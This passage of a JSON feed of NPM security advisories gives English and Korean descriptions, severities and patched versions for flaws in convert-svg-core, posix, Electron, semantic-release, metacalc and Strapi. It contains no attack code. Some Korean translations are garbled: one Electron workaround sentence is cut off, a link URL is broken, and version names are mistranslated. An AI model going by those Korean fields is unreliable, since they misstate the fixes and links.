    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-24429\nhttps://github.com/neocotic/convert-svg/issues/84\nhttps://github.com/neocotic/convert-svg/commit/a43dffaab0f1e419d5be84e2e7356b86ffac3cf1\nhttps://snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-2859212\nhttps://github.com/advisories/GHSA-54px-mhwv-5v8x",
    "name": "convert-svg-core",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.6.3",
    "identifier": "0.6.3",
    "descriptionKR": "0.6.3 이전의 패키지 convert-svg-core는 특별히 제작된 SVG 파일을 사용할 때 임의 코드 주입에 취약합니다. 공격자는 파일 시스템에서 임의의 파일을 읽은 다음 파일 내용을 변환된 PNG 파일로 표시할 수 있습니다."
  },
  {
    "description": "This affects all versions of package posix. When invoking the toString method, it will fallback to 0x0 value, as the value of toString is not invokable (not a function), and then it will crash with type-check.",
    "identifiers": "GHSA : GHSA-27mx-gchc-6xjp\nCVE : CVE-2022-21211",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:03:30Z",
    "publishedAt": "2022-06-11T00:00:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-21211\nhttps://snyk.io/vuln/SNYK-JS-POSIX-2400719\nhttps://github.com/advisories/GHSA-27mx-gchc-6xjp",
    "name": "posix",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 4.2.0",
    "descriptionKR": "이것은 패키지 posix의 모든 버전에 영향을 미칩니다. toString 메소드를 호출할 때 toString의 값은 호출할 수 없기 때문에(함수가 아님) 0x0 값으로 대체되고 유형 검사와 충돌합니다."
  },
  {
    "description": "### Impact\nThis vulnerability allows attackers who have control over a given apps update server / update storage to serve maliciously crafted update packages that pass the code signing validation check but contain malicious code in some components.\n\nPlease note that this kind of attack would require **significant** privileges in your own auto updating infrastructure and the ease of that attack entirely depends on your infrastructure security.\n\n### Patches\nThis has been patched and the following Electron versions contain the fix:\n\n* `18.0.0-beta.6`\n* `17.2.0`\n* `16.2.0`\n* `15.5.0`\n\n### Workarounds\nThere are no workarounds for this issue, please update to a patched version of Electron.\n\n### For more information\nIf you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org)",
    "identifiers": "GHSA : GHSA-77xc-hjv8-ww97\nCVE : CVE-2022-29257",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:04:28Z",
    "publishedAt": "2022-06-16T23:18:47Z",
    "references": "https://github.com/electron/electron/security/advisories/GHSA-77xc-hjv8-ww97\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-29257\nhttps://github.com/advisories/GHSA-77xc-hjv8-ww97",
    "name": "electron",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 18.0.0-beta.1, <= 18.0.0-beta.5",
    "identifier": "18.0.0-beta.6",
    "descriptionKR": "### 영향\n이 취약점을 통해 특정 앱 업데이트 서버/업데이트 저장소를 제어하는 ​​공격자가 코드 서명 유효성 검사를 통과하지만 일부 구성 요소에 악성 코드가 포함된 악의적으로 제작된 업데이트 패키지를 제공할 수 있습니다.\n\n이러한 종류의 공격에는 자체 자동 업데이트 인프라에서 **상당한** 권한이 필요하며 해당 공격의 용이성은 전적으로 인프라 보안에 달려 있습니다.\n\n### 패치\n이는 패치되었으며 다음 Electron 버전에 수정 사항이 포함되어 있습니다.\n\n* `18.0.0-베타.6`\n* `17.2.0`\n* `16.2.0`\n* `15.5.0`\n\n### 해결 방법\n이 문제에 대한 해결 방법이 없습니다. 패치된 버전의 Electron으로 업데이트하십시오.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있으면 [security@electronjs.org](mailto:security@electronjs.org)로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\nThis vulnerability allows attackers who have control over a given apps update server / update storage to serve maliciously crafted update packages that pass the code signing validation check but contain malicious code in some components.\n\nPlease note that this kind of attack would require **significant** privileges in your own auto updating infrastructure and the ease of that attack entirely depends on your infrastructure security.\n\n### Patches\nThis has been patched and the following Electron versions contain the fix:\n\n* `18.0.0-beta.6`\n* `17.2.0`\n* `16.2.0`\n* `15.5.0`\n\n### Workarounds\nThere are no workarounds for this issue, please update to a patched version of Electron.\n\n### For more information\nIf you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org)",
    "identifiers": "GHSA : GHSA-77xc-hjv8-ww97\nCVE : CVE-2022-29257",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:04:28Z",
    "publishedAt": "2022-06-16T23:18:47Z",
    "references": "https://github.com/electron/electron/security/advisories/GHSA-77xc-hjv8-ww97\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-29257\nhttps://github.com/advisories/GHSA-77xc-hjv8-ww97",
    "name": "electron",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 17.0.0, < 17.2.0",
    "identifier": "17.2.0",
    "descriptionKR": "### 영향\n이 취약점을 통해 특정 앱 업데이트 서버/업데이트 저장소를 제어하는 ​​공격자가 코드 서명 유효성 검사를 통과하지만 일부 구성 요소에 악성 코드가 포함된 악의적으로 제작된 업데이트 패키지를 제공할 수 있습니다.\n\n이러한 종류의 공격에는 자체 자동 업데이트 인프라에서 **상당한** 권한이 필요하며 해당 공격의 용이성은 전적으로 인프라 보안에 달려 있습니다.\n\n### 패치\n이는 패치되었으며 다음 Electron 버전에 수정 사항이 포함되어 있습니다.\n\n* `18.0.0-베타.6`\n* `17.2.0`\n* `16.2.0`\n* `15.5.0`\n\n### 해결 방법\n이 문제에 대한 해결 방법이 없습니다. 패치된 버전의 Electron으로 업데이트하십시오.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있으면 [security@electronjs.org](mailto:security@electronjs.org)로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\nThis vulnerability allows attackers who have control over a given apps update server / update storage to serve maliciously crafted update packages that pass the code signing validation check but contain malicious code in some components.\n\nPlease note that this kind of attack would require **significant** privileges in your own auto updating infrastructure and the ease of that attack entirely depends on your infrastructure security.\n\n### Patches\nThis has been patched and the following Electron versions contain the fix:\n\n* `18.0.0-beta.6`\n* `17.2.0`\n* `16.2.0`\n* `15.5.0`\n\n### Workarounds\nThere are no workarounds for this issue, please update to a patched version of Electron.\n\n### For more information\nIf you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org)",
    "identifiers": "GHSA : GHSA-77xc-hjv8-ww97\nCVE : CVE-2022-29257",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:04:28Z",
    "publishedAt": "2022-06-16T23:18:47Z",
    "references": "https://github.com/electron/electron/security/advisories/GHSA-77xc-hjv8-ww97\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-29257\nhttps://github.com/advisories/GHSA-77xc-hjv8-ww97",
    "name": "electron",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 16.0.0, < 16.2.0",
    "identifier": "16.2.0",
    "descriptionKR": "### 영향\n이 취약점을 통해 특정 앱 업데이트 서버/업데이트 저장소를 제어하는 ​​공격자가 코드 서명 유효성 검사를 통과하지만 일부 구성 요소에 악성 코드가 포함된 악의적으로 제작된 업데이트 패키지를 제공할 수 있습니다.\n\n이러한 종류의 공격에는 자체 자동 업데이트 인프라에서 **상당한** 권한이 필요하며 해당 공격의 용이성은 전적으로 인프라 보안에 달려 있습니다.\n\n### 패치\n이는 패치되었으며 다음 Electron 버전에 수정 사항이 포함되어 있습니다.\n\n* `18.0.0-베타.6`\n* `17.2.0`\n* `16.2.0`\n* `15.5.0`\n\n### 해결 방법\n이 문제에 대한 해결 방법이 없습니다. 패치된 버전의 Electron으로 업데이트하십시오.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있으면 [security@electronjs.org](mailto:security@electronjs.org)로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\nThis vulnerability allows attackers who have control over a given apps update server / update storage to serve maliciously crafted update packages that pass the code signing validation check but contain malicious code in some components.\n\nPlease note that this kind of attack would require **significant** privileges in your own auto updating infrastructure and the ease of that attack entirely depends on your infrastructure security.\n\n### Patches\nThis has been patched and the following Electron versions contain the fix:\n\n* `18.0.0-beta.6`\n* `17.2.0`\n* `16.2.0`\n* `15.5.0`\n\n### Workarounds\nThere are no workarounds for this issue, please update to a patched version of Electron.\n\n### For more information\nIf you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org)",
    "identifiers": "GHSA : GHSA-77xc-hjv8-ww97\nCVE : CVE-2022-29257",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:04:28Z",
    "publishedAt": "2022-06-16T23:18:47Z",
    "references": "https://github.com/electron/electron/security/advisories/GHSA-77xc-hjv8-ww97\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-29257\nhttps://github.com/advisories/GHSA-77xc-hjv8-ww97",
    "name": "electron",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 15.5.0",
    "identifier": "15.5.0",
    "descriptionKR": "### 영향\n이 취약점을 통해 특정 앱 업데이트 서버/업데이트 저장소를 제어하는 ​​공격자가 코드 서명 유효성 검사를 통과하지만 일부 구성 요소에 악성 코드가 포함된 악의적으로 제작된 업데이트 패키지를 제공할 수 있습니다.\n\n이러한 종류의 공격에는 자체 자동 업데이트 인프라에서 **상당한** 권한이 필요하며 해당 공격의 용이성은 전적으로 인프라 보안에 달려 있습니다.\n\n### 패치\n이는 패치되었으며 다음 Electron 버전에 수정 사항이 포함되어 있습니다.\n\n* `18.0.0-베타.6`\n* `17.2.0`\n* `16.2.0`\n* `15.5.0`\n\n### 해결 방법\n이 문제에 대한 해결 방법이 없습니다. 패치된 버전의 Electron으로 업데이트하십시오.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있으면 [security@electronjs.org](mailto:security@electronjs.org)로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\nThis vulnerability allows a renderer with JS execution to obtain access to a new renderer process with `nodeIntegrationInSubFrames` enabled which in turn allows effective access to `ipcRenderer`.\n\nPlease note the misleadingly named `nodeIntegrationInSubFrames` option does not implicitly grant Node.js access rather it depends on the existing `sandbox` setting.  If your application is sandboxed then `nodeIntegrationInSubFrames` just gives access to the sandboxed renderer APIs (which includes `ipcRenderer`).\n\nIf your application then additionally exposes IPC messages without IPC `senderFrame` validation that perform privileged actions or return confidential data this access to `ipcRenderer` can in turn compromise your application / user even with the sandbox enabled.\n\n### Patches\nThis has been patched and the following Electron versions contain the fix:\n\n* `18.0.0-beta.6`\n* `17.2.0`\n* `16.2.6`\n* `15.5.5`\n\n### Workarounds\nEnsure that all IPC message handlers appropriately validate `senderFrame` as per our [security tutorial here](https://github.com/electron/electron/blob/main/docs/tutorial/security.md#17-validate-the-sender-of-all-ipc-messages).\n\n### For more information\n\nIf you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org).",
    "identifiers": "GHSA : GHSA-mq8j-3h7h-p8g7\nCVE : CVE-2022-29247",
    "severity": "LOW",
    "updatedAt": "2023-01-27T05:04:57Z",
    "publishedAt": "2022-06-16T23:14:33Z",
    "references": "https://github.com/electron/electron/security/advisories/GHSA-mq8j-3h7h-p8g7\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-29247\nhttps://github.com/advisories/GHSA-mq8j-3h7h-p8g7",
    "name": "electron",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 18.0.0-beta.1, <= 18.0.0-beta.5",
    "identifier": "18.0.0-beta.6",
    "descriptionKR": "### 영향\n이 취약점으로 인해 JS 실행이 있는 렌더러는 `nodeIntegrationInSubFrames`가 활성화된 새로운 렌더러 프로세스에 대한 액세스 권한을 얻을 수 있으며, 이는 차례로 `ipcRenderer`에 대한 효과적인 액세스를 허용합니다.\n\n오해의 소지가 있는 이름의 `nodeIntegrationInSubFrames` 옵션은 암시적으로 Node.js 액세스 권한을 부여하지 않고 기존 `sandbox` 설정에 따라 달라집니다. 애플리케이션이 샌드박스인 경우 `nodeIntegrationInSubFrames`는 샌드박스 렌더러 API(`ipcRenderer` 포함)에 대한 액세스를 제공합니다.\n\n그런 다음 응용 프로그램이 IPC 'senderFrame' 유효성 검사 없이 권한 있는 작업을 수행하거나 기밀 데이터를 반환하는 IPC 메시지를 추가로 노출하는 경우 'ipcRenderer'에 대한 이 액세스는 샌드박스가 활성화된 상태에서도 응용 프로그램/사용자를 손상시킬 수 있습니다.\n\n### 패치\n이는 패치되었으며 다음 Electron 버전에 수정 사항이 포함되어 있습니다.\n\n* `18.0.0-베타.6`\n* `17.2.0`\n* `16.2.6`\n* `15.5.5`\n\n### 해결 방법\n모든 IPC 메시지 처리기가 [여기의 보안 자습서](https://github.com/electron/electron/blob/main/docs/tutorial/security.md#17-validate-the- 모든 ipc 메시지의 발신자).\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있으면 [security@electronjs.org](mailto:security@electronjs.org)로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\nThis vulnerability allows a renderer with JS execution to obtain access to a new renderer process with `nodeIntegrationInSubFrames` enabled which in turn allows effective access to `ipcRenderer`.\n\nPlease note the misleadingly named `nodeIntegrationInSubFrames` option does not implicitly grant Node.js access rather it depends on the existing `sandbox` setting.  If your application is sandboxed then `nodeIntegrationInSubFrames` just gives access to the sandboxed renderer APIs (which includes `ipcRenderer`).\n\nIf your application then additionally exposes IPC messages without IPC `senderFrame` validation that perform privileged actions or return confidential data this access to `ipcRenderer` can in turn compromise your application / user even with the sandbox enabled.\n\n### Patches\nThis has been patched and the following Electron versions contain the fix:\n\n* `18.0.0-beta.6`\n* `17.2.0`\n* `16.2.6`\n* `15.5.5`\n\n### Workarounds\nEnsure that all IPC message handlers appropriately validate `senderFrame` as per our [security tutorial here](https://github.com/electron/electron/blob/main/docs/tutorial/security.md#17-validate-the-sender-of-all-ipc-messages).\n\n### For more information\n\nIf you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org).",
    "identifiers": "GHSA : GHSA-mq8j-3h7h-p8g7\nCVE : CVE-2022-29247",
    "severity": "LOW",
    "updatedAt": "2023-01-27T05:04:57Z",
    "publishedAt": "2022-06-16T23:14:33Z",
    "references": "https://github.com/electron/electron/security/advisories/GHSA-mq8j-3h7h-p8g7\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-29247\nhttps://github.com/advisories/GHSA-mq8j-3h7h-p8g7",
    "name": "electron",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 17.0.0, < 17.2.0",
    "identifier": "17.2.0",
    "descriptionKR": "### 영향\n이 취약점으로 인해 JS 실행이 있는 렌더러는 `nodeIntegrationInSubFrames`가 활성화된 새로운 렌더러 프로세스에 대한 액세스 권한을 얻을 수 있으며, 이는 차례로 `ipcRenderer`에 대한 효과적인 액세스를 허용합니다.\n\n오해의 소지가 있는 이름의 `nodeIntegrationInSubFrames` 옵션은 암시적으로 Node.js 액세스 권한을 부여하지 않고 기존 `sandbox` 설정에 따라 달라집니다. 애플리케이션이 샌드박스인 경우 `nodeIntegrationInSubFrames`는 샌드박스 렌더러 API(`ipcRenderer` 포함)에 대한 액세스를 제공합니다.\n\n그런 다음 응용 프로그램이 IPC 'senderFrame' 유효성 검사 없이 권한 있는 작업을 수행하거나 기밀 데이터를 반환하는 IPC 메시지를 추가로 노출하는 경우 'ipcRenderer'에 대한 이 액세스는 샌드박스가 활성화된 상태에서도 응용 프로그램/사용자를 손상시킬 수 있습니다.\n\n### 패치\n이는 패치되었으며 다음 Electron 버전에 수정 사항이 포함되어 있습니다.\n\n* `18.0.0-베타.6`\n* `17.2.0`\n* `16.2.6`\n* `15.5.5`\n\n### 해결 방법\n모든 IPC 메시지 처리기가 [여기의 보안 자습서](https://github.com/electron/electron/blob/main/docs/tutorial/security.md#17-validate-the- 모든 ipc 메시지의 발신자).\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있으면 [security@electronjs.org](mailto:security@electronjs.org)로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\nThis vulnerability allows a renderer with JS execution to obtain access to a new renderer process with `nodeIntegrationInSubFrames` enabled which in turn allows effective access to `ipcRenderer`.\n\nPlease note the misleadingly named `nodeIntegrationInSubFrames` option does not implicitly grant Node.js access rather it depends on the existing `sandbox` setting.  If your application is sandboxed then `nodeIntegrationInSubFrames` just gives access to the sandboxed renderer APIs (which includes `ipcRenderer`).\n\nIf your application then additionally exposes IPC messages without IPC `senderFrame` validation that perform privileged actions or return confidential data this access to `ipcRenderer` can in turn compromise your application / user even with the sandbox enabled.\n\n### Patches\nThis has been patched and the following Electron versions contain the fix:\n\n* `18.0.0-beta.6`\n* `17.2.0`\n* `16.2.6`\n* `15.5.5`\n\n### Workarounds\nEnsure that all IPC message handlers appropriately validate `senderFrame` as per our [security tutorial here](https://github.com/electron/electron/blob/main/docs/tutorial/security.md#17-validate-the-sender-of-all-ipc-messages).\n\n### For more information\n\nIf you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org).",
    "identifiers": "GHSA : GHSA-mq8j-3h7h-p8g7\nCVE : CVE-2022-29247",
    "severity": "LOW",
    "updatedAt": "2023-01-27T05:04:57Z",
    "publishedAt": "2022-06-16T23:14:33Z",
    "references": "https://github.com/electron/electron/security/advisories/GHSA-mq8j-3h7h-p8g7\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-29247\nhttps://github.com/advisories/GHSA-mq8j-3h7h-p8g7",
    "name": "electron",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 16.0.0, < 16.2.6",
    "identifier": "16.2.6",
    "descriptionKR": "### 영향\n이 취약점으로 인해 JS 실행이 있는 렌더러는 `nodeIntegrationInSubFrames`가 활성화된 새로운 렌더러 프로세스에 대한 액세스 권한을 얻을 수 있으며, 이는 차례로 `ipcRenderer`에 대한 효과적인 액세스를 허용합니다.\n\n오해의 소지가 있는 이름의 `nodeIntegrationInSubFrames` 옵션은 암시적으로 Node.js 액세스 권한을 부여하지 않고 기존 `sandbox` 설정에 따라 달라집니다. 애플리케이션이 샌드박스인 경우 `nodeIntegrationInSubFrames`는 샌드박스 렌더러 API(`ipcRenderer` 포함)에 대한 액세스를 제공합니다.\n\n그런 다음 응용 프로그램이 IPC 'senderFrame' 유효성 검사 없이 권한 있는 작업을 수행하거나 기밀 데이터를 반환하는 IPC 메시지를 추가로 노출하는 경우 'ipcRenderer'에 대한 이 액세스는 샌드박스가 활성화된 상태에서도 응용 프로그램/사용자를 손상시킬 수 있습니다.\n\n### 패치\n이는 패치되었으며 다음 Electron 버전에 수정 사항이 포함되어 있습니다.\n\n* `18.0.0-베타.6`\n* `17.2.0`\n* `16.2.6`\n* `15.5.5`\n\n### 해결 방법\n모든 IPC 메시지 처리기가 [여기의 보안 자습서](https://github.com/electron/electron/blob/main/docs/tutorial/security.md#17-validate-the- 모든 ipc 메시지의 발신자).\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있으면 [security@electronjs.org](mailto:security@electronjs.org)로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\nThis vulnerability allows a renderer with JS execution to obtain access to a new renderer process with `nodeIntegrationInSubFrames` enabled which in turn allows effective access to `ipcRenderer`.\n\nPlease note the misleadingly named `nodeIntegrationInSubFrames` option does not implicitly grant Node.js access rather it depends on the existing `sandbox` setting.  If your application is sandboxed then `nodeIntegrationInSubFrames` just gives access to the sandboxed renderer APIs (which includes `ipcRenderer`).\n\nIf your application then additionally exposes IPC messages without IPC `senderFrame` validation that perform privileged actions or return confidential data this access to `ipcRenderer` can in turn compromise your application / user even with the sandbox enabled.\n\n### Patches\nThis has been patched and the following Electron versions contain the fix:\n\n* `18.0.0-beta.6`\n* `17.2.0`\n* `16.2.6`\n* `15.5.5`\n\n### Workarounds\nEnsure that all IPC message handlers appropriately validate `senderFrame` as per our [security tutorial here](https://github.com/electron/electron/blob/main/docs/tutorial/security.md#17-validate-the-sender-of-all-ipc-messages).\n\n### For more information\n\nIf you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org).",
    "identifiers": "GHSA : GHSA-mq8j-3h7h-p8g7\nCVE : CVE-2022-29247",
    "severity": "LOW",
    "updatedAt": "2023-01-27T05:04:57Z",
    "publishedAt": "2022-06-16T23:14:33Z",
    "references": "https://github.com/electron/electron/security/advisories/GHSA-mq8j-3h7h-p8g7\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-29247\nhttps://github.com/advisories/GHSA-mq8j-3h7h-p8g7",
    "name": "electron",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 15.5.5",
    "identifier": "15.5.5",
    "descriptionKR": "### 영향\n이 취약점으로 인해 JS 실행이 있는 렌더러는 `nodeIntegrationInSubFrames`가 활성화된 새로운 렌더러 프로세스에 대한 액세스 권한을 얻을 수 있으며, 이는 차례로 `ipcRenderer`에 대한 효과적인 액세스를 허용합니다.\n\n오해의 소지가 있는 이름의 `nodeIntegrationInSubFrames` 옵션은 암시적으로 Node.js 액세스 권한을 부여하지 않고 기존 `sandbox` 설정에 따라 달라집니다. 애플리케이션이 샌드박스인 경우 `nodeIntegrationInSubFrames`는 샌드박스 렌더러 API(`ipcRenderer` 포함)에 대한 액세스를 제공합니다.\n\n그런 다음 응용 프로그램이 IPC 'senderFrame' 유효성 검사 없이 권한 있는 작업을 수행하거나 기밀 데이터를 반환하는 IPC 메시지를 추가로 노출하는 경우 'ipcRenderer'에 대한 이 액세스는 샌드박스가 활성화된 상태에서도 응용 프로그램/사용자를 손상시킬 수 있습니다.\n\n### 패치\n이는 패치되었으며 다음 Electron 버전에 수정 사항이 포함되어 있습니다.\n\n* `18.0.0-베타.6`\n* `17.2.0`\n* `16.2.6`\n* `15.5.5`\n\n### 해결 방법\n모든 IPC 메시지 처리기가 [여기의 보안 자습서](https://github.com/electron/electron/blob/main/docs/tutorial/security.md#17-validate-the- 모든 ipc 메시지의 발신자).\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있으면 [security@electronjs.org](mailto:security@electronjs.org)로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nSecrets that would normally be masked by semantic-release can be accidentally disclosed if they contain characters that are excluded from uri encoding by [encodeURI](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURI). Occurrence is further limited to execution contexts where push access to the related repository is not available without modifying the repository url to inject credentials.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nFixed in 19.0.3\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nSecrets that do not contain characters that are excluded from encoding with `encodeURI` when included in a URL are already masked properly.\n\n### References\n_Are there any links users can visit to find out more?_\n* https://github.com/semantic-release/semantic-release/releases/tag/v19.0.3\n* https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURI\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a discussion in [semantic-release discussions](https://github.com/semantic-release/semantic-release/discussions)\n",
    "identifiers": "GHSA : GHSA-x2pg-mjhr-2m5x\nCVE : CVE-2022-31051",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:03:28Z",
    "publishedAt": "2022-06-09T23:51:25Z",
    "references": "https://github.com/semantic-release/semantic-release/security/advisories/GHSA-x2pg-mjhr-2m5x\nhttps://github.com/semantic-release/semantic-release/pull/2449\nhttps://github.com/semantic-release/semantic-release/pull/2459\nhttps://github.com/semantic-release/semantic-release/commit/58a226f29c04ee56bbb02cc661f020d568849cad\nhttps://github.com/semantic-release/semantic-release/releases/tag/v19.0.3\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31051\nhttps://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURI\nhttps://github.com/advisories/GHSA-x2pg-mjhr-2m5x",
    "name": "semantic-release",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 17.0.4, < 19.0.3",
    "identifier": "19.0.3",
    "descriptionKR": "### 영향\n_어떤 종류의 취약점입니까? 누가 영향을 받습니까?_\n\n일반적으로 semantic-release에 의해 가려지는 비밀은 [encodeURI](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference에 의해 uri 인코딩에서 제외되는 문자를 포함하는 경우 실수로 공개될 수 있습니다. /Global_Objects/encodeURI). 발생은 자격 증명을 주입하기 위해 리포지토리 URL을 수정하지 않고는 관련 리포지토리에 대한 푸시 액세스를 사용할 수 없는 실행 컨텍스트로 추가로 제한됩니다.\n\n### 패치\n_문제가 패치되었나요? 사용자는 어떤 버전으로 업그레이드해야 합니까?_\n\n19.0.3에서 수정됨\n\n### 해결 방법\n_사용자가 업그레이드하지 않고 취약점을 수정하거나 치료할 수 있는 방법이 있습니까?_\n\nURL에 포함될 때 'encodeURI'로 인코딩에서 제외되는 문자를 포함하지 않는 비밀은 이미 제대로 마스킹되어 있습니다.\n\n### 참조\n_사용자가 자세히 알아보기 위해 방문할 수 있는 링크가 있습니까?_\n* https://github.com/semantic-release/semantic-release/releases/tag/v19.0.3\n* https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURI\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [시맨틱 릴리스 토론](https://github.com/semantic-release/semantic-release/discussions)에서 토론 열기"
  },
  {
    "description": "The package metacalc before 0.0.2 is vulnerable to Arbitrary Code Execution when it exposes JavaScript's Math class to the v8 context. As the Math class is exposed to user-land, it can be used to get access to JavaScript's Function constructor.",
    "identifiers": "GHSA : GHSA-5gc4-cx9x-9c43\nCVE : CVE-2022-21122",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:03:40Z",
    "publishedAt": "2022-06-09T00:00:29Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-21122\nhttps://github.com/metarhia/metacalc/pull/16\nhttps://github.com/metarhia/metacalc/commit/625c23d63eabfa16fc815f5832b147b08d2144bd\nhttps://snyk.io/vuln/SNYK-JS-METACALC-2826197\nhttps://github.com/advisories/GHSA-5gc4-cx9x-9c43",
    "name": "metacalc",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.0.2",
    "identifier": "0.0.2",
    "descriptionKR": "0.0.2 이전의 패키지 metacalc는 JavaScript의 Math 클래스를 v8 컨텍스트에 노출할 때 임의 코드 실행에 취약합니다. Math 클래스는 사용자 영역에 노출되므로 JavaScript의 Function 생성자에 액세스하는 데 사용할 수 있습니다."
  },
  {
    "description": "An authenticated user with access to the Strapi admin panel can view private and sensitive data, such as email and password reset tokens, for API users if content types accessible to the authenticated user contain relationships to API users (from:users-permissions). There are many scenarios in which such details from API users can leak in the JSON response within the admin panel, either through a direct or indirect relationship. Access to this information enables a user to compromise these users’ accounts if the password reset API endpoints have been enabled. In a worst-case scenario, a low-privileged user could get access to a high-privileged API account, and could read and modify any data as well as block access to both the admin panel and API by revoking privileges for all other users.",
    "identifiers": "GHSA : GHSA-vgj7-895j-gpr6\nCVE : CVE-2022-30618",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:02:36Z",
    "publishedAt": "2022-05-20T00:00:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-30618\nhttps://www.synopsys.com/blogs/software-security/cyrc-advisory-strapi\nhttps://github.com/advisories/GHSA-vgj7-895j-gpr6",
    "name": "@strapi/strapi",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.1.9",
    "identifier": "4.1.9",
    "descriptionKR": "Strapi 관리 패널에 대한 액세스 권한이 있는 인증된 사용자는 인증된 사용자가 액세스할 수 있는 콘텐츠 유형에 API 사용자와의 관계(from:users-permissions)가 포함된 경우 API 사용자에 대한 이메일 및 암호 재설정 토큰과 같은 개인 정보 및 민감한 데이터를 볼 수 있습니다. API 사용자의 이러한 세부 정보가 직간접적인 관계를 통해 관리자 패널 내의 JSON 응답에서 유출될 수 있는 많은 시나리오가 있습니다. 이 정보에 액세스하면 암호 재설정 API 엔드포인트가 활성화된 경우 사용자가 이러한 사용자의 계정을 손상시킬 수 있습니다. 최악의 시나리오에서는 권한이 낮은 사용자가 권한이 높은 API 계정에 액세스할 수 있으며 모든 데이터를 읽고 수정할 수 있을 뿐만 아니라 다른 모든 사용자의 권한을 취소하여 관리자 패널과 API에 대한 액세스를 차단할 수 있습니다."
  },
  {
    "description": "An authenticated user with access to the Strapi admin panel can view private and sensitive data, such as email and password reset tokens, for API users if content types accessible to the authenticated user contain relationships to API users (from:users-permissions). There are many scenarios in which such details from API users can leak in the JSON response within the admin panel, either through a direct or indirect relationship. Access to this information enables a user to compromise these users’ accounts if the password reset API endpoints have been enabled. In a worst-case scenario, a low-privileged user could get access to a high-privileged API account, and could read and modify any data as well as block access to both the admin panel and API by revoking privileges for all other users.",
    "identifiers": "GHSA : GHSA-vgj7-895j-gpr6\nCVE : CVE-2022-30618",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:02:36Z",
    "publishedAt": "2022-05-20T00:00:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-30618\nhttps://www.synopsys.com/blogs/software-security/cyrc-advisory-strapi\nhttps://github.com/advisories/GHSA-vgj7-895j-gpr6",
    "name": "strapi",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.6.9",
    "identifier": "3.6.9",
